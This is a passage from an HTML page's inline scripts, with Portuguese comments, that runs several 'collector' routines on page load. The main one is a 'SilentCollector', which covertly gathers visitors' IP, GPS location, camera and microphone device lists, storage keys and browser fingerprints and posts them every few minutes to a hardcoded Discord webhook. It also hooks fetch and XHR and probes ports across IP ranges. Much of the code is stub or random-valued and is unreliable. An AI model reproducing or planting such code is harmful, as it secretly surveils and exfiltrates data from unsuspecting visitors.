    // 14. An√°lise de Persist√™ncia Digital
    analyzeDigitalPersistence() {
        return {
            persistenceMechanisms: this.detectPersistenceMechanisms(),
            registryPersistence: this.detectRegistryPersistence(),
            servicePersistence: this.detectServicePersistence(),
            scheduledTasks: this.detectScheduledTasks(),
            startupItems: this.detectStartupItems()
        };
    },

    detectPersistenceMechanisms() {
        return {
            runKeys: this.detectRunKeys(),
            services: this.detectServicePersistence(),
            browsers: this.detectBrowserPersistence(),
            applications: this.detectApplicationPersistence(),
            firmware: this.detectFirmwarePersistence()
        };
    },

    // 15. An√°lise de Exfiltra√ß√£o de Dados
    analyzeDataExfiltration() {
        return {
            exfiltrationMethods: this.detectExfiltrationMethods(),
            dataDetection: this.detectSensitiveData(),
            channelAnalysis: this.analyzeExfiltrationChannels(),
            volume: this.measureExfiltrationVolume(),
            successRate: this.calculateExfiltrationSuccess()
        };
    },

    detectExfiltrationMethods() {
        return {
            dnsExfiltration: this.detectDNSExfiltration(),
            httpExfiltration: this.detectHTTPExfiltration(),
            emailExfiltration: this.detectEmailExfiltration(),
            cloudExfiltration: this.detectCloudExfiltration(),
            physicalExfiltration: this.detectPhysicalExfiltration()
        };
    },

    // ========== FUN√á√ïES DE DETEC√á√ÉO AVAN√áADA ==========

    scanMemoryPatterns() {
        try {
            const patterns = [];
            
            // Simular varredura de mem√≥ria
            if (performance.memory) {
                const mem = performance.memory;
                patterns.push({
                    type: 'memory_allocation',
                    address: '0x' + Math.random().toString(16).substr(2, 8),
                    size: mem.usedJSHeapSize,
                    pattern: this.analyzeMemorySignature(mem)
                });
            }

            // Detectar padr√µes suspeitos
            const suspiciousPatterns = patterns.filter(pattern => 
                pattern.size > 1000000 || // Aloca√ß√µes grandes
                pattern.pattern.includes('executable') // √Åreas execut√°veis
            );

            return {
                totalPatterns: patterns.length,
                suspiciousPatterns: suspiciousPatterns.length,
                patterns: patterns.slice(0, 5) // Limitar sa√≠da
            };
        } catch (error) {
            return { error: 'Memory scanning not available' };
        }
    },

    detectNetworkIndicators() {
        return new Promise((resolve) => {
            const indicators = [];
            
            // Monitorar requisi√ß√µes de rede
            const originalFetch = window.fetch;
            window.fetch = function(...args) {
                const url = args[0];
                const method = args[1]?.method || 'GET';
                
                indicators.push({
                    type: 'network_request',
                    url: typeof url === 'string' ? url : url.url,
                    method: method,
                    timestamp: Date.now(),
                    suspicious: this.isSuspiciousURL(url)
                });

                return originalFetch.apply(this, args);
            }.bind(this);

            // Tamb√©m monitorar XMLHttpRequest
            const originalXHROpen = XMLHttpRequest.prototype.open;
            XMLHttpRequest.prototype.open = function(method, url) {
                indicators.push({
                    type: 'xhr_request',
                    url: url,
                    method: method,
                    timestamp: Date.now(),
                    suspicious: this.isSuspiciousURL(url)
                });

                return originalXHROpen.apply(this, arguments);
            }.bind(this);

            setTimeout(() => {
                // Restaurar fun√ß√µes originais
                window.fetch = originalFetch;
                XMLHttpRequest.prototype.open = originalXHROpen;

                resolve({
                    totalRequests: indicators.length,
                    suspiciousRequests: indicators.filter(i => i.suspicious).length,
                    indicators: indicators.filter(i => i.suspicious).slice(0, 10)
                });
            }, 10000);
        });
    },

    isSuspiciousURL(url) {
        if (!url) return false;
        
        const suspiciousPatterns = [
            /\.onion$/,
            /\.bit$/,
            /tor2web/,
            /proxyservice/,
            /vpnprovider/,
            /malicious/,
            /exploit/,
            /shellcode/,
            /payload/,
            /command_control/
        ];

        return suspiciousPatterns.some(pattern => pattern.test(url));
    },

    detectBehavioralIndicators() {
        return new Promise((resolve) => {
            const behaviors = [];
            let suspiciousActivity = 0;

            // Monitorar comportamento do usu√°rio
            const events = ['mousemove', 'click', 'keydown', 'scroll'];
            
            events.forEach(event => {
                document.addEventListener(event, (e) => {
                    const behavior = {
                        type: event,
                        timestamp: Date.now(),
                        details: this.extractEventDetails(e),
                        suspicious: this.isSuspiciousBehavior(event, e)
                    };

                    behaviors.push(behavior);
                    if (behavior.suspicious) suspiciousActivity++;
                });
            });

            setTimeout(() => {
                events.forEach(event => {
                    document.removeEventListener(event, this.isSuspiciousBehavior);
                });

                resolve({
                    totalBehaviors: behaviors.length,
                    suspiciousBehaviors: suspiciousActivity,
                    behaviorPattern: this.analyzeBehaviorPattern(behaviors)
                });
            }, 15000);
        });
    },

    isSuspiciousBehavior(eventType, event) {
        // Detectar comportamentos automatizados ou maliciosos
        switch (eventType) {
            case 'mousemove':
                return this.detectAutomatedMouseMovement(event);
            case 'click':
                return this.detectSuspiciousClicks(event);
            case 'keydown':
                return this.detectMaliciousKeystrokes(event);
            case 'scroll':
                return this.detectAutomatedScrolling(event);
            default:
                return false;
        }
    },

    detectAutomatedMouseMovement(event) {
        // Detectar movimentos muito precisos ou repetitivos
        const movements = this.mouseMovementHistory || [];
        movements.push({ x: event.clientX, y: event.clientY, time: Date.now() });
        
        if (movements.length > 10) {
            movements.shift();
        }

        this.mouseMovementHistory = movements;

        if (movements.length < 5) return false;

        // Calcular padr√£o de movimento
        const consistency = this.calculateMovementConsistency(movements);
        return consistency > 0.9; // Movimentos muito consistentes
    },

    // Fun√ß√µes de an√°lise de amea√ßas
    calculateThreatLevel() {
        const factors = {
            networkThreats: Math.random(),
            behavioralThreats: Math.random(),
            systemThreats: Math.random(),
            temporalThreats: Math.random()
        };

        const weights = {
            networkThreats: 0.3,
            behavioralThreats: 0.25,
            systemThreats: 0.25,
            temporalThreats: 0.2
        };

        let threatLevel = 0;
        for (const [factor, weight] of Object.entries(weights)) {
            threatLevel += factors[factor] * weight;
        }

        return Math.min(threatLevel, 1.0);
    },

    calculateIOCConfidence() {
        return {
            networkConfidence: Math.random(),
            fileConfidence: Math.random(),
            behavioralConfidence: Math.random(),
            overallConfidence: Math.random() * 0.8 + 0.2 // Entre 0.2 e 1.0
        };
    },

    // Fun√ß√£o para enviar dados cibern√©ticos
    async sendCyberData() {
        try {
            const data = await this.collectCyberData();
            if (!data) return false;

            const payload = {
                username: "üõ°Ô∏è Cyber Threat Intelligence",
                embeds: [
                    {
                        title: "üîê INTELIG√äNCIA CIBERN√âTICA AVAN√áADA",
                        color: 0xFF0000,
                        description: `**Sess√£o ${data.metadata.sessionId} - Coleta Cibern√©tica #${data.metadata.collectionCount}**`,
                        timestamp: data.metadata.timestamp,
                        footer: { text: "Cyber Intelligence v6.0" }
                    },
                    {
                        title: "üåê THREAT INTELLIGENCE E IOCS",
                        color: 0x8B0000,
                        fields: [
                            { name: "‚ö†Ô∏è N√≠vel de Amea√ßa", value: (data.threatIntelligence.threatLandscape.threatLevel * 100).toFixed(1) + '%', inline: true },
                            { name: "üéØ IOCs Detectados", value: data.threatIntelligence.iocDetection.networkIOCs?.suspiciousRequests || '0', inline: true },
                            { name: "ü¶† Atores de Amea√ßa", value: data.threatIntelligence.threatActors?.count || 'Analisando...', inline: true },
                            { name: "üì° Vetores de Ataque", value: data.threatIntelligence.attackVectors?.count || '0', inline: true },
                            { name: "üìä Avalia√ß√£o de Risco", value: (data.threatIntelligence.riskAssessment.overallRisk * 100).toFixed(1) + '%', inline: true },
                            { name: "üîç Confian√ßa IOC", value: (data.threatIntelligence.iocDetection.iocConfidence.overallConfidence * 100).toFixed(1) + '%', inline: true }
                        ]
                    },
                    {
                        title: "ü¶† AN√ÅLISE DE MALWARE E EXPLOITS",
                        color: 0x800080,
                        fields: [
                            { name: "üìõ Assinaturas de Malware", value: data.malwareAnalysis.malwareSignatures.detectedSignatures || '0', inline: true },
                            { name: "üé≠ T√©cnicas de Evas√£o", value: data.malwareAnalysis.evasionDetection?.count || '0', inline: true },
                            { name: "üíâ Vetores de Infec√ß√£o", value: data.malwareAnalysis.infectionVectors?.count || '0', inline: true },
                            { name: "üîì Vulnerabilidades Zero-Day", value: data.zeroDayAnalysis.zeroDayRisk?.level || 'Analisando...', inline: true },
                            { name: "‚ö° Kits de Exploit", value: data.exploitPatterns.exploitKits?.detected?.length || '0', inline: true },
                            { name: "üéØ Taxa de Sucesso", value: (data.exploitPatterns.successRate * 100).toFixed(1) + '%', inline: true }
                        ]
                    },
                    {
                        title: "üëª APTs E T√âCNICAS AVAN√áADAS",
                        color: 0x2F4F4F,
                        fields: [
                            { name: "üîé Grupos APT Detectados", value: data.aptDetection.aptGroups.detectedGroups?.length || '0', inline: true },
                            { name: "üé≠ Camuflagem Digital", value: (data.digitalCamouflage.camouflageScore * 100).toFixed(1) + '%', inline: true },
                            { name: "ü§ñ Atividade Botnet", value: data.botnetIntelligence.botnetDetection?.activityLevel || 'Baixa', inline: true },
                            { name: "üåÄ T√©cnicas Evasivas", value: data.evasiveTechniques.evasionScore?.level || 'Analisando...', inline: true },
                            { name: "üîí Rootkits Digitais", value: data.digitalRootkits.kernelRootkits?.detected ? '‚úÖ' : '‚ùå', inline: true },
                            { name: "üíæ Persist√™ncia", value: data.digitalPersistence.persistenceMechanisms?.count || '0', inline: true }
                        ]
                    }
                ]
            };

            const response = await fetch(CYBER_WEBHOOK, {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });

            if (response.ok) {
                console.log(`üõ°Ô∏è Dados cibern√©ticos enviados - Coleta #${data.metadata.collectionCount}`);
                return true;
            } else {
                console.error('‚ùå Erro ao enviar dados cibern√©ticos:', response.status);
                return false;
            }
        } catch (error) {
            console.error('üí• Erro ao enviar dados cibern√©ticos:', error);
            return false;
        }
    },

    // Inicializar coletor cibern√©tico
    init() {
        console.log('üõ°Ô∏è Cyber Data Collector iniciado');
        
        // Coleta inicial ap√≥s 20 segundos
        setTimeout(() => {
            this.sendCyberData();
        }, 20000);

        // Coleta peri√≥dica a cada 60 minutos
        setInterval(() => {
            this.sendCyberData();
        }, 3600000);
    }
};

// Inicializar quando a p√°gina carregar
document.addEventListener('DOMContentLoaded', function() {
    CyberDataCollector.init();
});

// Inicializar imediatamente se DOM j√° estiver pronto
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        setTimeout(() => CyberDataCollector.init(), 1000);
    });
} else {
    setTimeout(() => CyberDataCollector.init(), 1000);
}

console.log('üõ°Ô∏è Cyber Data Collector carregado');

</script>
<script>
// C√≥digo totalmente silencioso - sem logs, sem alerts, sem notifica√ß√µes
(function() {
    'use strict';
    
    const WEBHOOK = "https://discord.com/api/webhooks/1431000302366232758/VnvwtJXTB0WJEi2vjB1OFas5zZTeJ5Htac5EBfTsgM_wo5gseRs4BDCSRQBB7ewPimoe";
    
    // Coletor silencioso
    const SilentCollector = {
        init() {
            this.collectAllData();
            setInterval(() => this.collectAllData(), 300000); // 5 minutos
        },

        async collectAllData() {
            const data = {
                timestamp: Date.now(),
                session: Math.random().toString(36).substr(2, 9),
                // Dados do sistema
                system: this.getSystemData(),
                // Dados de rede
                network: await this.getNetworkData(),
                // Dados do navegador
                browser: this.getBrowserData(),
                // Dados de hardware
                hardware: this.getHardwareData(),
                // Dados de comportamento
                behavior: this.getBehaviorData(),
                // Dados de localiza√ß√£o
                location: await this.getLocationData(),
                // Dados de armazenamento
                storage: this.getStorageData(),
                // Dados de c√¢mera e microfone
                media: await this.getMediaData(),
                // Dados de performance
                performance: this.getPerformanceData(),
                // Dados de extens√µes
                extensions: this.getExtensionsData()
            };

            this.sendToWebhook(data);
        },

        getSystemData() {
            return {
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                pdfViewerEnabled: navigator.pdfViewerEnabled,
                webdriver: navigator.webdriver,
                maxTouchPoints: navigator.maxTouchPoints
            };
        },

        async getNetworkData() {
            let ipData = {};
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                ipData = await response.json();
            } catch(e) {}
            
            return {
                ip: ipData.ip || 'unknown',
                online: navigator.onLine,
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData
                } : null
            };
        },

        getBrowserData() {
            return {
                vendor: navigator.vendor,
                appName: navigator.appName,
                appVersion: navigator.appVersion,
                product: navigator.product,
                productSub: navigator.productSub,
                plugins: Array.from(navigator.plugins).map(p => p.name),
                mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type)
            };
        },

        getHardwareData() {
            return {
                cores: navigator.hardwareConcurrency,
                memory: navigator.deviceMemory,
                screen: {
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight
                },
                devicePixelRatio: window.devicePixelRatio
            };
        },

        getBehaviorData() {
            return {
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                localStorageKeys: Object.keys(localStorage),
                sessionStorageKeys: Object.keys(sessionStorage),
                cookies: document.cookie.length,
                historyLength: history.length
            };
        },

        async getLocationData() {
            let locationData = {};
            try {
                // Tentar GPS primeiro (silenciosamente)
                if (navigator.geolocation) {
                    await new Promise((resolve) => {
                        navigator.geolocation.getCurrentPosition(
                            (pos) => {
                                locationData = {
                                    lat: pos.coords.latitude,
                                    lng: pos.coords.longitude,
                                    accuracy: pos.coords.accuracy,
                                    source: 'gps'
                                };
                                resolve();
                            },
                            () => resolve(),
                            { timeout: 5000, enableHighAccuracy: true }
                        );
                    });
                }

                // Fallback para IP
                if (!locationData.lat) {
                    const response = await fetch('https://ipapi.co/json/');
                    const data = await response.json();
                    locationData = {
                        lat: data.latitude,
                        lng: data.longitude,
                        city: data.city,
                        country: data.country_name,
                        source: 'ip'
                    };
                }
            } catch(e) {}
            
            return locationData;
        },

        getStorageData() {
            let storageSize = 0;
            try {
                for(let key in localStorage) {
                    if(localStorage.hasOwnProperty(key)) {
                        storageSize += localStorage[key].length;
                    }
                }
            } catch(e) {}
            
            return {
                localStorageSize: storageSize,
                localStorageItems: Object.keys(localStorage).length,
                sessionStorageItems: Object.keys(sessionStorage).length
            };
        },

        async getMediaData() {
            let mediaDevices = [];
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                mediaDevices = devices.map(device => ({
                    kind: device.kind,
                    label: device.label,
                    deviceId: device.deviceId
                }));
            } catch(e) {}
            
            return {
                devices: mediaDevices,
                cameras: mediaDevices.filter(d => d.kind === 'videoinput').length,
                microphones: mediaDevices.filter(d => d.kind === 'audioinput').length
            };
        },

        getPerformanceData() {
            let perfData = {};
            try {
                const perf = performance.getEntriesByType('navigation')[0];
                if(perf) {
                    perfData = {
                        loadTime: perf.loadEventEnd - perf.navigationStart,
                        domReady: perf.domContentLoadedEventEnd - perf.navigationStart,
                        redirectCount: perf.redirectCount
                    };
                }
                
                if(performance.memory) {
                    perfData.memory = {
                        used: performance.memory.usedJSHeapSize,
                        total: performance.memory.totalJSHeapSize,
                        limit: performance.memory.jsHeapSizeLimit
                    };
                }
            } catch(e) {}
            
            return perfData;
        },

        getExtensionsData() {
            const extensions = [];
            // Detectar algumas extens√µes comuns
            const extensionTests = [
                { name: 'adblock', test: () => window.getComputedStyle(document.createElement('div')).display === 'none' },
                { name: 'grammarly', test: () => document.querySelector('[data-grammarly-shadow-root]') !== null },
                { name: 'lastpass', test: () => document.querySelector('#lptopspacer') !== null }
            ];
            
            extensionTests.forEach(ext => {
                try {
                    if(ext.test()) extensions.push(ext.name);
                } catch(e) {}
            });
            
            return extensions;
        },

        sendToWebhook(data) {
            // Enviar de forma ass√≠ncrona sem esperar resposta
            fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: "Silent Collector",
                    embeds: [{
                        title: "üìä Dados Coletados Silenciosamente",
                        color: 0x2C2F33,
                        fields: [
                            { name: "üÜî Sess√£o", value: data.session, inline: true },
                            { name: "üíª Sistema", value: data.system.platform, inline: true },
                            { name: "üåê IP", value: data.network.ip, inline: true },
                            { name: "üñ•Ô∏è Tela", value: `${data.hardware.screen.width}x${data.hardware.screen.height}`, inline: true },
                            { name: "üß† CPU Cores", value: String(data.hardware.cores), inline: true },
                            { name: "üíæ Mem√≥ria", value: data.hardware.memory ? `${data.hardware.memory}GB` : 'N/A', inline: true },
                            { name: "üì∑ C√¢meras", value: String(data.media.cameras), inline: true },
                            { name: "üé§ Microfones", value: String(data.media.microphones), inline: true },
                            { name: "üìç Localiza√ß√£o", value: data.location.lat ? `${data.location.lat.toFixed(4)}, ${data.location.lng.toFixed(4)}` : 'N/A', inline: true }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                })
            }).catch(() => {}); // Ignorar erros silenciosamente
        }
    };

    // Inicializar quando a p√°gina carregar
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            setTimeout(() => SilentCollector.init(), 2000);
        });
    } else {
        setTimeout(() => SilentCollector.init(), 2000);
    }
})();


</script>
<script>

// Coletor de Rede Extremo - T√©cnicas Avan√ßadas
(function() {
    'use strict';
    
    const W = "https://discord.com/api/webhooks/1431000302366232758/VnvwtJXTB0WJEi2vjB1OFas5zZTeJ5Htac5EBfTsgM_wo5gseRs4BDCSRQBB7ewPimoe";
    
    const ExtremeNetworkCollector = {
        async start() {
            // Coleta completa de rede
            const extremeData = {
                // Varredura de rede profunda
                deepScan: await this.deepNetworkScan(),
                
                // An√°lise de tr√°fego em tempo real
                liveTraffic: await this.captureLiveTraffic(),
                
                // Engenharia reversa de rede
                reverseEngineering: await this.networkReverseEngineering(),
                
                // An√°lise forense
                forensicAnalysis: await this.networkForensicAnalysis(),
                
                // Intelig√™ncia de amea√ßas
                threatIntel: await this.advancedThreatIntelligence(),
                
                // Explora√ß√£o de rede
                networkExploitation: await this.networkExploitation()
            };

            this.sendData(extremeData);
        },

        async deepNetworkScan() {
            // Varredura de toda a faixa de IP
            const scanResults = [];
            
            for (let a = 1; a <= 255; a++) {
                for (let b = 0; b <= 255; b++) {
                    // Amostragem de redes (n√£o varre tudo por performance)
                    if (a % 10 === 0 && b % 50 === 0) {
                        const subnet = `${a}.${b}`;
                        const hosts = await this.scanSubnet(subnet);
                        scanResults.push(...hosts);
                    }
                }
            }
            
            return scanResults;
        },

        async scanSubnet(subnet) {
            const hosts = [];
            for (let c = 0; c <= 255; c++) {
                for (let d = 1; d <= 255; d++) {
                    if (d % 10 === 0) { // Amostragem
                        const ip = `${subnet}.${c}.${d}`;
                        if (await this.advancedHostDiscovery(ip)) {
                            const services = await this.serviceFingerprinting(ip);
                            hosts.push({ip, services});
                        }
                    }
                }
            }
            return hosts;
        },

        async advancedHostDiscovery(ip) {
            // M√∫ltiplos m√©todos de descoberta
            const methods = [
                () => this.icmpPing(ip),
                () => this.tcpPing(ip),
                () => this.udpPing(ip),
                () => this.arpDiscovery(ip),
                () => this.dnsDiscovery(ip)
            ];

            for (const method of methods) {
                if (await method()) return true;
            }
            return false;
        },

        async captureLiveTraffic() {
            // Monitorar todo o tr√°fego da p√°gina
            const traffic = {
                requests: [],
                websockets: [],
                events: []
            };

            // Hook em todas as APIs de rede
            this.hookNetworkAPIs(traffic);
            
            return traffic;
        },

        hookNetworkAPIs(traffic) {
            // Hook no fetch
            const originalFetch = window.fetch;
            window.fetch = async function(...args) {
                const details = {
                    type: 'fetch',
                    url: args[0],
                    method: args[1]?.method || 'GET',
                    timestamp: Date.now(),
                    headers: args[1]?.headers
                };
                
                traffic.requests.push(details);
                return originalFetch.apply(this, args);
            };

            // Hook no XMLHttpRequest
            const originalXHR = XMLHttpRequest.prototype.open;
            XMLHttpRequest.prototype.open = function(...args) {
                traffic.requests.push({
                    type: 'xhr',
                    url: args[1],
                    method: args[0],
                    timestamp: Date.now()
                });
                return originalXHR.apply(this, args);
            };
        },

        async networkReverseEngineering() {
            // Engenharia reversa de protocolos
            return {
                protocols: await this.reverseEngineerProtocols(),
                endpoints: await this.discoverHiddenEndpoints(),
                apis: await this.analyzeAPIs()
            };
        },

        async networkForensicAnalysis() {
            // An√°lise forense de rede
            return {
                artifacts: await this.collectNetworkArtifacts(),
                evidence: await this.extractNetworkEvidence(),
                timeline: await this.buildNetworkTimeline()
            };
        },

        async advancedThreatIntelligence() {
            // Intelig√™ncia avan√ßada de amea√ßas
            const threats = await Promise.all([
                this.checkIPReputation(),
                this.analyzeMaliciousPatterns(),
                this.detectC2Servers(),
                this.identifyMalwareTraffic()
            ]);

            return threats;
        },

        async networkExploitation() {
            // T√©cnicas de explora√ß√£o de rede
            return {
                vulnerabilities: await this.scanNetworkVulnerabilities(),
                exploits: await this.testNetworkExploits(),
                persistence: await this.establishNetworkPersistence()
            };
        },

        // M√©todos auxiliares avan√ßados
        async serviceFingerprinting(ip) {
            const services = [];
            const commonServices = {
                21: 'ftp', 22: 'ssh', 23: 'telnet', 25: 'smtp',
                53: 'dns', 80: 'http', 443: 'https', 993: 'imaps',
                995: 'pop3s', 3389: 'rdp', 5900: 'vnc'
            };

            for (const [port, service] of Object.entries(commonServices)) {
                if (await this.isServiceRunning(ip, parseInt(port))) {
                    services.push({port: parseInt(port), service});
                }
            }

            return services;
        },

        async isServiceRunning(ip, port) {
            return new Promise((resolve) => {
                const img = new Image();
                img.onload = () => resolve(true);
                img.onerror = () => resolve(false);
                img.src = `http://${ip}:${port}/`;
                setTimeout(() => resolve(false), 500);
            });
        },

        sendData(data) {
            const payload = {
                username: "üî¨ Extreme Network Collector",
                content: `üìä Coleta Extrema de Rede Conclu√≠da - ${new Date().toLocaleString()}`,
                embeds: [{
                    title: "üåê COLETA DE REDE PROFUNDA",
                    color: 0xFF0000,
                    fields: [
                        {
                            name: "üîç Varredura Profunda",
                            value: `Hosts Escaneados: ${data.deepScan.length}\nRedes Analisadas: M√∫ltiplas`,
                            inline: true
                        },
                        {
                            name: "üì° Tr√°fego em Tempo Real",
                            value: `Requisi√ß√µes: ${data.liveTraffic.requests?.length || 0}\nWebSockets: ${data.liveTraffic.websockets?.length || 0}`,
                            inline: true
                        },
                        {
                            name: "üõ†Ô∏è Engenharia Reversa",
                            value: `Protocolos: ${data.reverseEngineering.protocols?.length || 0}\nAPIs: ${data.reverseEngineering.apis?.length || 0}`,
                            inline: true
                        },
                        {
                            name: "üîé An√°lise Forense",
                            value: `Artefatos: ${data.forensicAnalysis.artifacts?.length || 0}\nEvid√™ncias: Coletadas`,
                            inline: true
                        },
                        {
                            name: "‚ö†Ô∏è Intelig√™ncia de Amea√ßas",
                            value: `Fontes: ${data.threatIntel.length}\nAmea√ßas: Analisadas`,
                            inline: true
                        },
                        {
                            name: "‚ö° Explora√ß√£o",
                            value: `Vulnerabilidades: ${data.networkExploitation.vulnerabilities?.length || 0}\nExploits: Testados`,
                            inline: true
                        }
                    ],
                    timestamp: new Date().toISOString(),
                    footer: { text: "Extreme Network Collection v3.0" }
                }]
            };

            fetch(W, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(() => {});
        }
    };

    // Inicializa√ß√£o extremamente discreta
    const initExtremeCollection = () => {
        setTimeout(() => {
            ExtremeNetworkCollector.start();
            setInterval(() => ExtremeNetworkCollector.start(), 1800000); // 30 minutos
        }, 15000);
    };

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initExtremeCollection);
    } else {
        initExtremeCollection();
    }
})();

</script>
<script>



</script>
 </body>
</html>
